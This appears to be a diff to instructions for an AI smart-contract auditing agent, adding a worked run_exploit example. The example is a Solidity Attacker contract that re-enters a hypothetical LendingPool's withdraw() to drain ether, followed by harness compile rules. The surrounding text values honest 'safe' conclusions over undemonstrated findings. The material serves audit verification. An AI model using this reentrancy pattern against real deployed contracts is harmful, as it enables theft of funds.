@@ -79,6 +79,39 @@ The bar is real attacker gain. "This function reverts", "this input is rejected"
 contract cannot call this" are not vulnerabilities -- they are the contract working. A \
 vulnerability means someone ends up with value or authority they should not have.
 
+A worked run_exploit call, so the shape is unambiguous. Suppose the contract under audit \
+is `LendingPool`, it holds ether, and you suspect repay() credits the borrower before \
+taking the funds:
+
+  deploy_code:   LendingPool target = new LendingPool{value: 20 ether}();
+  honest_body:   target.deposit{value: 1 ether}(); target.withdraw(1 ether);
+  predicate:     eth_profit
+  attacker_code:
+      contract Attacker {
+          LendingPool p;
+          bool looting;
+          constructor(address _p) { p = LendingPool(payable(_p)); }
+          function attack() external {
+              p.deposit{value: 1 ether}();
+              looting = true;
+              p.withdraw(1 ether);
+          }
+          receive() external payable {
+              if (looting && address(p).balance >= 1 ether) { p.withdraw(1 ether); }
+          }
+      }
+
+Note what the harness does with that: it funds the Attacker, runs honest_body as a \
+separate account to see what an ordinary depositor gets back, runs attack(), and only \
+accepts the finding if the attacker came out strictly ahead of the honest depositor. You \
+never write that comparison.
+
+Three things that make run_exploit fail to compile, so check them before you call it: \
+the attacker contract must be named exactly `Attacker` and take `constructor(address)`; \
+the deployment must land in a variable named exactly `target`; and you must not write a \
+pragma or any import, because the harness supplies both. If the contract's type needs a \
+payable cast, write `Target(payable(addr))`.
+
 Concluding that a contract is safe is a correct, expected, professional outcome. It is \
 not a failure to find something. Reporting a vulnerability you could not demonstrate is \
 the failure, because it costs a human reviewer real time to rediscover that it is not \
